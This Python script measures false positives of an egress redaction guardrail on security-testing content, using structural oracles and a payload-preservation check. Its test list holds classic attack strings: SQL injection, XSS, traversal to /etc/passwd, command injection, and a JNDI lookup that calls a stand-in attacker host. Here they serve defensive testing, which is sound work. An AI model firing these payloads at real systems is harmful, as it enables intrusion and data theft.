#!/usr/bin/env python3
"""Measure what the egress guardrail does to legitimate security-testing content.

Both defence-landscape and measurement research for this project reported the same
gap: no published study quantifies the false-positive rate of a content guardrail on a
real security-testing workload. That gap matters here more than anywhere, because this
system's legitimate traffic is *made of* the things a guardrail is tuned to notice —
injection payloads, traversal strings, credentials in vulnerable-by-design source, and
long hex that is almost always a file hash.

The measurement problem is deciding what counts as a false positive without hand-labelling
a corpus. A redaction inside WebGoat source is not automatically wrong: WebGoat teaches
about hardcoded credentials, so some of its strings really are credentials and removing
them is correct behaviour.

So this does not try to judge every alteration. It reports three different things:

1. **Unambiguous false positives**, decided by structure rather than by opinion. Some
   contexts cannot contain a credential no matter what they look like — a Java `package`
   or `import` line is a dotted identifier, a `sha256:` prefix introduces a digest, and
   the committed attack-surface locators were already proven secret-free by their own
   exporter. Any alteration inside one of those is wrong by construction.

   This class is not hypothetical. A length-only JWT pattern rewrote
   `organization.applications.configuration` into a redaction placeholder — caught by
   hand during review, which is not a method that scales. These oracles catch it
   automatically.

2. **Alteration rate**, per detector, reported without judgement. It says how much of the
   real workload the guardrail touches at all. A high rate is not proof of a bug, but it
   is the number to watch when a detector changes.

3. **Payload preservation**, as a hard property: known attack payloads must survive
   byte-identically, because a system that mangles the exploit strings it is analysing
   degrades every downstream result invisibly.

The output is a baseline artifact, not a gate. Thresholds set before the distribution is
known are guesses; this repository's exact-match drift checks were only ever set after
the thing was measured.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import re
import sys
from datetime import datetime, timezone

ROOT = pathlib.Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "infra" / "litellm" / "guardrails"))

import egress_redaction  # noqa: E402

# --- structural oracles ------------------------------------------------------------
# Each answers "could this span have held a credential?" with a definite no.

# A Java package or import statement is a dotted type path. It is also the exact shape a
# length-only JWT pattern matches, which is how this class was discovered.
JAVA_DOTTED = re.compile(r"^\s*(?:package|import)\s+(?:static\s+)?[\w.]+\s*;")

# `sha256:` and friends introduce a digest. A digest authenticates nothing on its own.
HASH_CONTEXT = re.compile(r"(?i)(?:sha256|sha1|md5|digest|checksum)\s*[:=]\s*[0-9a-f]{16,}")

# A Maven/Gradle coordinate is group:artifact:version. The negative lookahead keeps the
# credential keywords out of the first segment: `password:hunter2:2024` has the shape of
# a coordinate and is not one, and clearing it would report a correct redaction as a
# false positive.
DEP_COORDINATE = re.compile(
    r"^\s*(?!(?:token|secret|password|api[_-]?key|authorization|cookie)\b)"
    r"[\w.\-]+:[\w.\-]+:[\d][\w.\-]*\s*$",
    re.IGNORECASE,
)

ORACLES = {
    "java-dotted-identifier": JAVA_DOTTED,
    "hash-context": HASH_CONTEXT,
    "dependency-coordinate": DEP_COORDINATE,
}

# The detectors, applied here against the ORIGINAL document rather than read back out of
# redact()'s findings.
#
# redact() runs its detectors in five sequential passes, each over the previous pass's
# output, and records each match's offset against the text that pass was given. Once the
# PEM pass collapses a key block to a one-line placeholder — or an assignment pass
# collapses a quoted value that spanned newlines — every later pass's line numbers are
# shifted relative to the original. Reading them back and indexing the original document
# with them attributes a finding to whatever line has drifted into that position, which
# means an oracle can inspect an unrelated line: a real false positive gets missed, or an
# imaginary one manufactured.
#
# Measuring against the original avoids the shift entirely and yields the matched SPAN,
# which is what an oracle has to judge. Patterns are reused rather than restated so the
# measurement cannot drift from the guardrail it measures.
# Resolved on each call rather than captured at import, so a test can substitute a
# pattern and watch the measurement react. A harness whose behaviour cannot be perturbed
# cannot be shown to detect anything.
def detectors() -> tuple[tuple[str, "re.Pattern[str]"], ...]:
    return (
        ("pem-private-key", egress_redaction._PEM_BLOCK),
        ("assignment", egress_redaction._ASSIGNMENT),
        ("credential-prefix", egress_redaction._CREDENTIAL_PREFIX),
        ("jwt", egress_redaction._JWT),
        ("uuid", egress_redaction._UUID),
    )

# Payloads that are this system's legitimate cargo. Mangling one is a defect regardless
# of what any rate says.
ATTACK_PAYLOADS = [
    "' OR 1=1--",
    "admin'--",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "../../../../etc/passwd",
    "${jndi:ldap://attacker/x}",
    "; cat /etc/passwd",
    "%27%20OR%20%271%27%3D%271",
    "{{7*7}}",
    "<!--#exec cmd=\"ls\"-->",
]


def iter_corpus(root: pathlib.Path) -> list[tuple[str, str, str]]:
    """Collect the real content this gateway carries.

    Returns (corpus_name, document_id, text). Missing sources are skipped rather than
    faked — a measurement over invented data would describe nothing.
    """
    docs: list[tuple[str, str, str]] = []

    webgoat = root / "benchmark" / "targets" / "webgoat-src"
    if webgoat.is_dir():
        for path in sorted(webgoat.rglob("*.java")):
            try:
                docs.append(("webgoat-java", str(path.relative_to(webgoat)), path.read_text(encoding="utf-8")))
            except (OSError, UnicodeDecodeError):
                continue

    for name in ("nuclei.san.jsonl", "semgrep.san.json", "trivy.san.json"):
        path = root / "scanners" / "out" / name
        if path.is_file():
            try:
                docs.append(("sanitized-scanner-report", name, path.read_text(encoding="utf-8")))
            except (OSError, UnicodeDecodeError):
                continue

    # Already proven secret-free by its own exporter's negative controls, so any
    # alteration here is unambiguous.
    baselines = root / "attack-surface" / "baselines"
    if baselines.is_dir():
        for path in sorted(baselines.glob("*.json")):
            docs.append(("attack-surface-baseline", path.name, path.read_text(encoding="utf-8")))

    return docs


def locate_matches(original: str) -> list[dict]:
    """Every span each detector would act on, positioned in the ORIGINAL document."""
    out = []
    for detector, pattern in detectors():
        for match in pattern.finditer(original):
            start = match.start()
            line_number = original.count("\n", 0, start) + 1
            line_start = original.rfind("\n", 0, start) + 1
            line_end = original.find("\n", start)
            line = original[line_start : line_end if line_end != -1 else len(original)]
            out.append(
                {
                    "detector": detector,
                    "line_number": line_number,
                    "line": line,
                    # Span offsets relative to the line, so an oracle can ask whether it
                    # covers the matched text rather than merely sharing a line with it.
                    "span": (start - line_start, min(match.end(), line_end if line_end != -1 else len(original)) - line_start),
                }
            )
    return out


def classify(line: str, span: tuple[int, int], corpus: str) -> str | None:
    """Return the oracle proving this SPAN could not have held a credential, or None.

    The span matters, not the line. An oracle that only has to share a line with the
    match will clear a correct redaction whenever the two coexist — `import org.foo.Bar;
    // password=hunter2` is a dotted identifier AND a real credential, and judging it by
    the line alone reports the correct redaction as a false positive. Inflated
    false-positive counts are not a harmless error: the natural response is to narrow the
    detector, which is how a real leak ships.
    """
    if corpus == "attack-surface-baseline":
        # The exporter refuses forbidden fields, path tokens and high-entropy segments,
        # and its own suite proves each of those controls fails when it should, so this
        # artifact is secret-free by construction rather than by inspection.
        return "proven-secret-free-artifact"
    for name, pattern in ORACLES.items():
        for match in pattern.finditer(line):
            if match.start() <= span[0] and span[1] <= match.end():
                return name
    return None


def measure(root: pathlib.Path) -> dict:
    docs = iter_corpus(root)
    per_detector: dict[str, int] = {}
    per_corpus: dict[str, dict] = {}
    false_positives: list[dict] = []

    flagged_only: dict[str, int] = {}

    for corpus, doc_id, text in docs:
        stats = per_corpus.setdefault(
            corpus, {"documents": 0, "documents_altered": 0, "redactions_located": 0}
        )
        stats["documents"] += 1

        redacted, findings = egress_redaction.redact(text)
        for finding in findings:
            # High-entropy content is flagged for an operator without being rewritten.
            # It is counted separately rather than dropped: how often that heuristic
            # fires on real content is the evidence behind the decision not to redact it.
            bucket = per_detector if finding.get("redacted") is not False else flagged_only
            bucket[finding["class"]] = bucket.get(finding["class"], 0) + 1

        if redacted == text:
            continue
        stats["documents_altered"] += 1

        for match in locate_matches(text):
            stats["redactions_located"] += 1
            oracle = classify(match["line"], match["span"], corpus)
            if oracle:
                false_positives.append(
                    {
                        "corpus": corpus,
                        "document": doc_id,
                        "line": match["line_number"],
                        "detector": match["detector"],
                        "oracle": oracle,
                        # No text. A case is fully identified by where it is and which
                        # oracle proves it wrong, and this artifact is committed to a
                        # public repository — quoting the line the redactor acted on
                        # would risk publishing the thing it removed. Re-run the harness
                        # locally to see context.
                    }
                )

    preserved = []
    for payload in ATTACK_PAYLOADS:
        wrapped = f"finding evidence: {payload}"
        out, _ = egress_redaction.redact(wrapped)
        preserved.append({"payload": payload, "survives": payload in out})

    return {
        "measured_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "corpus": per_corpus,
        "documents_total": len(docs),
        "redactions_by_detector": dict(sorted(per_detector.items())),
        "flagged_not_redacted": dict(sorted(flagged_only.items())),
        "unambiguous_false_positives": {
            "count": len(false_positives),
            "by_oracle": {
                name: sum(1 for f in false_positives if f["oracle"] == name)
                for name in sorted({f["oracle"] for f in false_positives})
            },
            "cases": false_positives[:50],
            "cases_truncated": max(0, len(false_positives) - 50),
        },
        "attack_payload_preservation": {
            "checked": len(preserved),
            "mangled": [p["payload"] for p in preserved if not p["survives"]],
        },
        "interpretation": {
            "what_this_measures": (
                "How the egress guardrail behaves on the content this gateway actually "
                "carries. Unambiguous false positives are decided by structure, not by "
                "opinion: the contexts listed cannot hold a credential."
            ),
            "what_this_does_not_measure": (
                "It is not a recall figure. A redaction inside vulnerable-by-design "
                "source may be correct, because that source really does contain "
                "hardcoded credentials; those alterations are counted in the rate and "
                "deliberately not judged here."
            ),
            "not_a_gate": (
                "Recorded as a baseline. A threshold set before the distribution is "
                "known is a guess."
            ),
        },
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--root", type=pathlib.Path, default=ROOT, help="repository root")
    parser.add_argument("--output", type=pathlib.Path, help="write the baseline artifact here")
    args = parser.parse_args()

    result = measure(args.root)

    fp = result["unambiguous_false_positives"]
    mangled = result["attack_payload_preservation"]["mangled"]
    print(f"documents scanned          : {result['documents_total']}")
    for corpus, stats in sorted(result["corpus"].items()):
        print(f"  {corpus:26} {stats['documents_altered']}/{stats['documents']} altered, "
              f"{stats['redactions_located']} redactions")
    print(f"redactions by detector     : {result['redactions_by_detector']}")
    print(f"flagged, not redacted      : {result['flagged_not_redacted']}")
    print(f"unambiguous false positives: {fp['count']} {fp['by_oracle'] or ''}")
    print(f"attack payloads mangled    : {len(mangled)} {mangled or ''}")

    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        print(f"wrote {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
